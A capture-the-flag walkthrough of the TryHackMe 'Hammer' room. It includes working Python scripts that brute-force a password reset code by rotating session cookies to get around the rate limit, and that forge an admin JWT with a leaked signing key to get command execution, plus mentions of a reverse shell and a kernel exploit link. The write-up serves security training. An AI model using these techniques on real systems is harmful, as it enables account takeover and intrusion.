# Hammer

{% embed url="https://tryhackme.com/r/room/hammer" %}

The following post by 0xb0b is licensed under [CC BY 4.0![](https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1)![](https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1)](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

* * *

> Always question your assumptions and never assume anything that you have not tested.

## Recon

### Nmap Scan

We start with a Nmap scan and find two open ports. On port `22` we have SSH and on port `1337` we have an Apache web server.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FHlS8czSlTahbcZE4nlAw%2Fgrafik.png?alt=media&token=d7e32ef9-890c-4ab8-ac81-3e65e4b72a57)

</figure>

### Directory Scan And Manuel Enum of 1337

Since our entry point is probably the web server, we scan for possible directories and pages using Feroxbuster while enumerating the target manually.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2Fq9lHFJjCYGR4QKWCzWNY%2Fgrafik.png?alt=media&token=60e2d912-9bcc-4367-8a93-80646920dccc)

</figure>

We find some pages and directories. Among them PhpMyAdmin. So we are dealing with a PHP web server. Apart from these, however, nothing else, except that the CSS folder looks a bit strange.

```
┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
└─$ feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hammer.thm:1337
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
200      GET       36l       83w     1326c http://hammer.thm:1337/
301      GET        9l       28w      320c http://hammer.thm:1337/javascript => http://hammer.thm:1337/javascript/
301      GET        9l       28w      320c http://hammer.thm:1337/phpmyadmin => http://hammer.thm:1337/phpmyadmin/
301      GET        9l       28w      316c http://hammer.thm:1337/vendor => http://hammer.thm:1337/vendor/
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/autoload.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_real.php
200      GET       63l      136w     2071c http://hammer.thm:1337/vendor/composer/installed.json
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_static.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_classmap.php
200      GET       19l      168w     1068c http://hammer.thm:1337/vendor/composer/LICENSE
200      GET       30l      224w     1529c http://hammer.thm:1337/vendor/firebase/php-jwt/LICENSE
200      GET       42l      100w     1173c http://hammer.thm:1337/vendor/firebase/php-jwt/composer.json
200      GET      170l      650w     8697c http://hammer.thm:1337/vendor/firebase/php-jwt/CHANGELOG.md
200      GET      424l     1529w    13516c http://hammer.thm:1337/vendor/firebase/php-jwt/README.md
301      GET        9l       28w      327c http://hammer.thm:1337/javascript/jquery => http://hammer.thm:1337/javascript/jquery/
301      GET        9l       28w      324c http://hammer.thm:1337/phpmyadmin/doc => http://hammer.thm:1337/phpmyadmin/doc/
200      GET       98l      278w    35231c http://hammer.thm:1337/phpmyadmin/favicon.ico

```

Visiting the index page by manual enumeration takes us directly to a login page.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FFYpyFYwgR5IHhhH3uWE4%2Fgrafik.png?alt=media&token=ed77282a-08b7-43cd-a9a2-c64974b61700)

</figure>

In the source, we find the named convention of the directories. These start with `hmr_`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FTrgAVqH4rRVjM3PdM2Qi%2Fgrafik.png?alt=media&token=506e7728-734e-438d-8ac4-b2559ab45b84)

</figure>

So we edit the used wordlist by prepending `hmr_` and scan again.

```bash
cp /usr/share/wordlists/dirb/big.txt .
sed 's/^/hmr_/' big.txt > hmr_big.txt
```

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FxrMlFnaIe8Wssu0xiqCV%2Fgrafik.png?alt=media&token=9c54c61a-372e-414b-8bd0-46f229ff52b6)

</figure>

We now find a directory `hmr_logs`, which has directory listing activated. This directory contains an `error.logs` file.

```
┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
└─$ feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hammer.thm:1337
 🚀  Threads               │ 50
 📖  Wordlist              │ hmr_big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
200      GET       36l       83w     1326c http://hammer.thm:1337/
301      GET        9l       28w      317c http://hammer.thm:1337/hmr_css => http://hammer.thm:1337/hmr_css/
301      GET        9l       28w      320c http://hammer.thm:1337/hmr_images => http://hammer.thm:1337/hmr_images/
200      GET     1676l     9897w   792599c http://hammer.thm:1337/hmr_images/hammer.webp
301      GET        9l       28w      316c http://hammer.thm:1337/hmr_js => http://hammer.thm:1337/hmr_js/
200      GET        2l     1294w    89501c http://hammer.thm:1337/hmr_js/jquery-3.6.0.min.js
301      GET        9l       28w      318c http://hammer.thm:1337/hmr_logs => http://hammer.thm:1337/hmr_logs/
200      GET        9l      219w     1984c http://hammer.thm:1337/hmr_logs/error.logs
[####################] - 25s    20480/20480   0s      found:10      errors:0      
[####################] - 24s    20469/20469   844/s   http://hammer.thm:1337/ 
[####################] - 0s     20469/20469   193104/s http://hammer.thm:1337/hmr_css/ => Directory listing
[####################] - 1s     20469/20469   34172/s http://hammer.thm:1337/hmr_images/ => Directory listing
[####################] - 0s     20469/20469   84583/s http://hammer.thm:1337/hmr_js/ => Directory listing
[####################] - 0s     20469/20469   208867/s http://hammer.thm:1337/hmr_logs/ => Directory listing
```

## Bypass The Login

With the information we have gathered so far, we should now concentrate on the login.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FDhfJ9xaoS0pSXJNmTOqa%2Fgrafik.png?alt=media&token=75e9490c-984c-4dd4-88a2-229a7f5f4ff5)

</figure>

### Login Page Analysis

This only displays a generic message for the email and password entered, from which we cannot conclude that an incorrect email or password has been entered. A pure brute force to enumerate the email is therefore not possible here.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2F4jO5uibvFoGJZluaQXCE%2Fgrafik.png?alt=media&token=9cbe2a7f-61e0-4c64-bfee-89e97c911fae)

</figure>

But the login page has a link to a forgot password feature `/reset_password.php`. This gives an error message if the chosen mail is wrong, theoretically a valid mail could be enumerated in this way.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FhEhPOZ1z8Ur2FUQDgO2z%2Fgrafik.png?alt=media&token=420662f7-3545-48d4-9323-2d14f37b1edc)

</figure>

### Getting A Valid E-Mail Address

Recalling the enumeration using the cusomized wordlist we are able to spot an email in the `error.logs.` There is an authentication failure for the user `tester@hammer.thm`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FmfJbjpmp4utgSXPUv7fs%2Fgrafik.png?alt=media&token=da7ebce0-1b75-40ca-bdf7-b3f4c80f53a6)

</figure>

### Exploitation Of The Password Reset Feature

When trying to reset the password for this user, ...

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FGUZmxPGfizZOqrZsCQw3%2Fgrafik.png?alt=media&token=6f5d5984-bf2d-4ffd-81c2-cc99960c7b5c)

</figure>

... the paged refreshes and we have to enter a 4-digit code to change the password. Furthermore, there is a time limit of `180` seconds to enter this code.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FbNQE8ZLIdfPuMsvawPlR%2Fgrafik.png?alt=media&token=e1744f12-a8f7-4db3-843d-ce172bf510ef)

</figure>

For the further procedure and analyzing, we intercept the submitting of the 4-digit code using burp suite.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FSAVEP2xAn2ZVgcGrvZLw%2Fgrafik.png?alt=media&token=3df8b3e7-9e84-4516-9388-1358ea172627)

</figure>

With every request that is now made, the Rate-Limit-Pending value in the response header is reduced. Initially this starts at `8`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FEE9cS0vB64gpvXA84bur%2Fgrafik.png?alt=media&token=df7fd682-b96c-4135-8d46-df08f64d6b4f)

</figure>

After the value drops to `0`, the rate limit is reached and the token cannot be reset. At this point I lost a lot of time because I thought that with every reset the token would also be reset. Under this assumption, I thought I could only get a token with a bit of luck and chance.

Therefore, I wrote a script that makes `100` requests at the same time with different `PHPSESSID`s in the hope of getting a valid reset with a fixed reset token. In fact, after several attempts I had a valid request token, but `100` identical response, for each session the fixed token was valid.

Only then did I realize that the token endures in that time frame over every session created, and does not reset itself with a new session. The assumption could be made by seeing that a token endures `180` seconds.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FzRIZFTNBeINcTeq5wrfb%2Fgrafik.png?alt=media&token=bca7ac08-b7ac-4a6a-8921-76004b0e7d24)

</figure>

To verify that the reset token endures, we request a new reset without a cookie to get a new session.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2F8xAsVkSafV6S9QhGSYEz%2Fgrafik.png?alt=media&token=ebed81c6-719d-4c41-a9fd-58eb200c71a7)

</figure>

Then we put the `PHPSESSID` from the response into our request, and see that we have 8 attempts again, until the `180` seconds have passed.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FxHFerDj2OYrlfpkyWtxj%2Fgrafik.png?alt=media&token=99e2c8c4-e452-4dfc-ac85-0552d9221fbf)

</figure>

With the information we have, we are able to automates the process of brute-forcing a password recovery. It first requests a password reset and retrieves the `PHPSESSID` cookie, then iteratively submits recovery codes in a brute-force manner, periodically refreshing the `PHPSESSID` every seventh request. The script detects a successful code submission by checking for a change in the response text's word count.

{% code title="brute.py" overflow="wrap" lineNumbers="true" %}

```python
import subprocess

def get_phpsessid():
    # Request Password Reset and retrieve the PHPSESSID cookie
    reset_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", "email=tester%40hammer.thm",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-v"
    ]

    # Execute the curl command and capture the output
    response = subprocess.run(reset_command, capture_output=True, text=True)

    # Extract PHPSESSID from the response
    phpsessid = None
    for line in response.stderr.splitlines():
        if "Set-Cookie: PHPSESSID=" in line:
            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
            break

    return phpsessid

def submit_recovery_code(phpsessid, recovery_code):
    # Submit Recovery Code using the retrieved PHPSESSID
    recovery_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", f"recovery_code={recovery_code}&s=180",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: PHPSESSID={phpsessid}",
        "--silent"
    ]

    # Execute the curl command for recovery code submission
    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
    return response_recovery.stdout

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID. Exiting...")
        return
    
    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string

        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
            phpsessid = get_phpsessid()
            if not phpsessid:
                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
                continue
        
        response_text = submit_recovery_code(phpsessid, recovery_code)
        word_count = len(response_text.split())

        if word_count != 148:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(f"Response Text: {response_text}")
            break

if __name__ == "__main__":
    main()

```

{% endcode %}

After we have run the script, we receive the valid recovery code, the `PHPSESSID` and the response body.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FI6BtcCtQCxQvlpKrKd3F%2Fgrafik.png?alt=media&token=f053676b-8665-409e-be89-746bc79c2390)

</figure>

### Reset The Password

All we have to do now is set the PHPSESSID in the browser and reload the page.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FSKLG7YLopRxRpsJsj7XF%2Fgrafik.png?alt=media&token=06526ce8-5127-4898-b9ce-4d7623e19001)

</figure>

After we have reloaded the page, we can reset the password for the user `tester@hammer.thm`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FQEax5tV9vyTPNrNDGDlK%2Fgrafik.png?alt=media&token=f57a2da9-2b95-49a6-93cd-a84219521840)

</figure>

We choose a new password.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FVac18YYvNl6HvedUbaDF%2Fgrafik.png?alt=media&token=b4e2bb59-d6ee-4db3-b059-ee036f7e3733)

</figure>

We then log in with the new credentials ...

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FPUoYzF3oq3AUuwLFxi7a%2Fgrafik.png?alt=media&token=f032a38a-0aa6-4eeb-a970-e68add1fdc21)

</figure>

... and are forwarded to the dashboard. We see that we have the role `user`, can enter commands and are greeted with the first flag. After a short time, we are logged out.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FjQVPDR6JIDwAVrLLhkFC%2Fgrafik.png?alt=media&token=57145ac3-b4ef-4724-a29f-7f952d5da0fa)

</figure>

## RCE

First we look at what lets us log out, in the source we see a script that checks the cookies after an interval and if the condition is not met, we are logged out. If `persistentSession` is not set to True, we will be logged out. Using the OWASP ZAP tool, we can set this value permanently, but we can also continue our investigation using Burp Suite without being logged out.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FSPAzU1B970df3f1d8eGl%2Fgrafik.png?alt=media&token=29c7d1fe-8540-4efa-ad00-23b7174df479)

</figure>

Furthermore, there is a script that listens for a click event on the `#submitCommand` button and retrieves a command input by the user. It then sends an AJAX POST request to `execute_command.php`, including the command and a JWT token in the request headers for authorization. Upon receiving a response, it displays the result or an error message in the `#commandOutput` element. This script is responsible for the command transmission.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FvjJmobHsNWiKQ86FmEGM%2Fgrafik.png?alt=media&token=9f46fce4-0d08-4918-919d-f7961a6a9d80)

</figure>

### Analysis Command Execution

We intercept the request to transfer the command using Burp Suite. We see the token in the header and in the cookie. Furthermore, we are not allowed to execute the ID command. We use FFuF with a word list to check which commands can be used.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FNbADlYBBi9ba0jiKmRqp%2Fgrafik.png?alt=media&token=d73da81a-2294-48ee-ad04-4c17df8ae7ea)

</figure>

### Key File

It seems that we can only execute the ls command. Besides the pages and directories we already know there is a `.key` file present. We remember that our user role was displayed in the dashboard. It is possible that other roles can execute more.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FZAkWqitcQ0kC3E2QqiDi%2Fgrafik.png?alt=media&token=6604a36b-955f-4311-a427-af92aed96642)

</figure>

### JWT Token Creation

We analyze the JWT token using `jwt.io` and can make out the structure, in the header a `kid` is set, that points to a key file located at `/var/www/mykey.key`. Furthermore the token contains the role user. Maybe with another role like admin we would be able to execute arbitrary commands.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FLIVBSwKlZRx0blnET4A1%2Fgrafik.png?alt=media&token=368a1e71-9a58-44e0-bb10-03a9db7b4e1e)

</figure>

We recall the listing of our `ls` command, here we had a key file. The key file contains a hash value. Possibly the secret for signing a JWT token. So we can probably craft our own token, since we have access to the secret and can guess the location of the token for the kid.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FhlzZKRswrLN9Cuahls6i%2Fgrafik.png?alt=media&token=f27f31d8-1a7e-4e41-a91e-49bda91cd51d)

</figure>

Let's create an admin token with a structure like this:

{% hint style="info" %}  
The first token we create is for the role user we already know, to confirm that our self-created token works. However, this is not shown below.  
{% endhint %}

```
{
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key",
  "typ": "JWT"
}
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1725193591,
  "exp": 1725199591,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
)
```

We use a python script to create a token with admin role, we enter content line `4` and path of the secret line `10`. We also set the expiry date a little higher for us.

{% code title="craft_token.py" overflow="wrap" lineNumbers="true" %}

```python
import jwt

# The secret key from /var/www/mykey.key
secret_key = "REDACTED"

# JWT header including 'kid'
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/REDACTED.key"
}

# Payload with the 'admin' role
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1725193591,
    "exp": 1725199591,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

# Encode the JWT with the specific header
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)

# Print the generated token
print(token)
```

{% endcode %}

Running the script, we get a token, signed with the secret, located in the web root folder.

{% hint style="info" %}  
It is possible that the brute force takes longer than the 180 seconds that the token lasts. Therefore, the script may not necessarily find the valid token during its execution. Another attempt must then be made.  
{% endhint %}

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FvJ5L9oUIuo04deVfSE6V%2Fgrafik.png?alt=media&token=45821697-d307-400f-9b88-108f28016a49)

</figure>

Using `jwt.io`, we are able to confirm its new content.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2F825urmY2Fu9PhmOJQNMs%2Fgrafik.png?alt=media&token=3bbf11d9-0124-43ee-996d-1642f4543fe3)

</figure>

### Arbitrary Remote Code Execution

Next, we replace the token value in the Authorization header and token cookie value. After that, we are able to execute arbitrary commands as admin. Using ID we see, we are `www-data`.\\

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FUcxb0VzbAjLcsmb4JvQf%2Fgrafik.png?alt=media&token=99d882c6-db25-458d-9f18-9f8d4312bb25)

</figure>

As `www-data` we are able to retrieve the second flag at `/home/ubuntu.flag.txt`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FeoyjphbV1I9n2i2CalDR%2Fgrafik.png?alt=media&token=af6e2f8a-6015-4198-9de3-2a41288812b6)

</figure>

## Summary

In this challenge we faced a vulnerable web application on an Apache server. An Nmap scan identified SSH on port `22` and a web server on port `1337`. After directory scanning and manual enumeration, we discovered a PhpMyAdmin page and a `hmr_logs` directory containing an `error.logs` file. The logs revealed a valid email (`tester@hammer.thm`), which we used to exploit the password reset feature.

The password reset mechanism was vulnerable to brute-force attacks, as it allowed multiple attempts to guess the 4-digit reset code within a time limit, bypassing its rate limit by retrieving a new session every 7ths request. By automating the brute-force process and circumventing rate limits, we successfully reset the user's password. After logging in, we got the first flag and analyzed and manipulated the JWT token to escalate our privileges to `admin`, enabling arbitrary command execution as `www-data` and retrieving the second flag at `/home/ubuntu.flag.txt`.

## Bonus

As a little bonus, we take a look around on the system after receiving the RCE. We set up a listener and get a reverse shell using busybox.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FGe1wJBDpMPkQTxkbJnnd%2Fgrafik.png?alt=media&token=dec5f810-da65-45cb-b52c-54ba2fa26686)

</figure>

Next, we upgrade our shell and run `linpeas.sh`.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FzaV18OfeUGpBtkOYfXIy%2Fgrafik.png?alt=media&token=f9e35013-9fe1-4054-8695-aab7e7c897cd)

</figure>

We are able to find some database credentials ...

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FFAkr3Qkz8119MCXGfvXf%2Fgrafik.png?alt=media&token=c2490b73-b8c5-46e9-99c5-2611a2d710d1)

</figure>

... and take a small peek.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2FdmJ3yro1L7tGoLLbzWpk%2Fgrafik.png?alt=media&token=051eda77-40dc-473e-988e-fcf869198a25)

</figure>

Furthermore, we are able to retrieve the secret used by the application to sign the JWT token.

<figure>![](https://2148487935-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FoqaFccsCrwKo1CHmLRKW%2Fuploads%2Fr6xEWzHjV8lxTgakqANX%2Fgrafik.png?alt=media&token=aa7a6b0d-ebf7-46ab-b640-dd531986d8f8)

</figure>

Unfortunately, a successful execution of the following exploit did not work.

{% embed url="https://github.com/Notselwyn/CVE-2024-1086" %}